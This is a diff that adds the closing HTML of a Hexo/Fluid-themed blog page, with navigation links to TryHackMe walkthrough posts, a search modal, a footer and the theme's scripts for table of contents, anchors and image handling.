+                        <span class="hidden-mobile">TryHackMe Walkthrough - Juicy Details</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/post/Tryhackme-Daily-Bugle.html" title="TryHackMe Walkthrough - Daily Bugle">
+                        <span class="hidden-mobile">TryHackMe Walkthrough - Daily Bugle</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
